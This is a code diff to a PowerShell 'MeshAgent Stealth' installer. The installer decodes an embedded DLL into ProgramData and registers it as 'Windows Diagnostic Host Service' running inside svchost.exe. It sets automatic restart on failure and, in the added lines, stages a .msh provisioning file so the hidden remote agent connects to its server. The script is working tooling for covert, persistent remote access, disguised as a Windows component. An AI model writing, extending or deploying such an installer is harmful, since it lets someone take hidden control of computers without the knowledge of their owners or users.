@@ -50,6 +50,10 @@ $installer = @'
 # MeshAgent Stealth - One-Click Installer
 $ErrorActionPreference = 'Stop'
 
+param(
+    [string]$MshPath
+)
+
 Write-Host "=== MeshAgent Stealth Installer ===" -ForegroundColor Cyan
 Write-Host ""
 
@@ -59,20 +63,64 @@ $DisplayName = "Windows Diagnostic Host Service"
 $programData = [Environment]::GetFolderPath('CommonApplicationData')
 if (-not $programData) { $programData = Join-Path $env:SystemRoot 'ProgramData' }
 $InstallDir = Join-Path $programData 'DiagnosticHost'
+$MshTarget = Join-Path $InstallDir 'WinDiagnosticHost.msh'
 
-Write-Host "[1/5] Stopping old service..." -ForegroundColor Yellow
+Write-Host "[1/6] Stopping old service..." -ForegroundColor Yellow
 try { Stop-Service -Name $ServiceName -Force -ErrorAction SilentlyContinue; Start-Sleep -Seconds 3 } catch {}
 
-Write-Host "[2/5] Creating directories..." -ForegroundColor Yellow
+Write-Host "[2/6] Creating directories..." -ForegroundColor Yellow
 New-Item -Path $InstallDir -ItemType Directory -Force | Out-Null
 
-Write-Host "[3/5] Extracting DLL..." -ForegroundColor Yellow
+Write-Host "[3/6] Extracting DLL..." -ForegroundColor Yellow
 $dllB64 = "DLL_BASE64_HERE"
 $dllBytes = [Convert]::FromBase64String($dllB64)
 $dllPath = "$InstallDir\diagsvc.dll"
 [System.IO.File]::WriteAllBytes($dllPath, $dllBytes)
 
-Write-Host "[4/5] Registering service..." -ForegroundColor Yellow
+Write-Host "[4/6] Staging provisioning..." -ForegroundColor Yellow
+$provisioningSources = @()
+if ($MshPath) {
+    try {
+        $resolved = Resolve-Path -Path $MshPath -ErrorAction Stop
+        $provisioningSources += $resolved.ProviderPath
+    } catch {
+        Write-Host "      [WARN] Provided -MshPath not found: $MshPath" -ForegroundColor Yellow
+    }
+}
+
+$installerDir = Split-Path -Parent $PSCommandPath
+$provisioningSources += @(
+    (Join-Path $installerDir 'WinDiagnosticHost.msh'),
+    ([System.IO.Path]::ChangeExtension($PSCommandPath, '.msh'))
+) | Where-Object { $_ -and (Test-Path $_) } | ForEach-Object { (Resolve-Path $_).ProviderPath } | Select-Object -Unique
+
+$mshStaged = $false
+foreach ($source in $provisioningSources) {
+    try {
+        Copy-Item -Path $source -Destination $MshTarget -Force
+        Write-Host "      Provisioning copied from $source" -ForegroundColor Gray
+        $mshStaged = $true
+        break
+    } catch {
+        Write-Host "      [WARN] Failed to copy provisioning from $source: $($_.Exception.Message)" -ForegroundColor Yellow
+    }
+}
+
+if ($mshStaged) {
+    try {
+        Copy-Item -Path $MshTarget -Destination (Join-Path $InstallDir '.msh') -Force
+        $dllBaseName = [System.IO.Path]::GetFileNameWithoutExtension($dllPath)
+        if (-not [string]::IsNullOrEmpty($dllBaseName)) {
+            Copy-Item -Path $MshTarget -Destination (Join-Path $InstallDir ("$dllBaseName.msh")) -Force
+        }
+    } catch {
+        Write-Host "      [WARN] Unable to replicate provisioning aliases: $($_.Exception.Message)" -ForegroundColor Yellow
+    }
+} else {
+    Write-Host "      [WARN] No provisioning file staged. Place WinDiagnosticHost.msh in $InstallDir manually." -ForegroundColor Yellow
+}
+
+Write-Host "[5/6] Registering service..." -ForegroundColor Yellow
 $svcPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$ServiceName"
 if (Get-Service -Name $ServiceName -ErrorAction SilentlyContinue) { sc.exe delete $ServiceName | Out-Null; Start-Sleep -Seconds 2 }
 
@@ -98,7 +146,7 @@ if ($currentServices -notcontains $ServiceName) {
 
 sc.exe failure $ServiceName reset= 86400 actions= restart/10000/restart/30000 | Out-Null
 
-Write-Host "[5/5] Starting service..." -ForegroundColor Yellow
+Write-Host "[6/6] Starting service..." -ForegroundColor Yellow
 Start-Service -Name $ServiceName
 Start-Sleep -Seconds 3
 
@@ -107,7 +155,11 @@ if ($svc.Status -eq 'Running') {
     Write-Host ""
     Write-Host "=== SUCCESS ===" -ForegroundColor Green  
     Write-Host "Service running in svchost.exe" -ForegroundColor Cyan
-    Write-Host "Agent should appear online shortly!" -ForegroundColor Yellow
+    if (-not $mshStaged) {
+        Write-Host "Agent requires provisioning (.msh) before connecting." -ForegroundColor Yellow
+    } else {
+        Write-Host "Agent should appear online shortly!" -ForegroundColor Yellow
+    }
 } else {
     Write-Host "[WARNING] Service not running" -ForegroundColor Yellow
 }
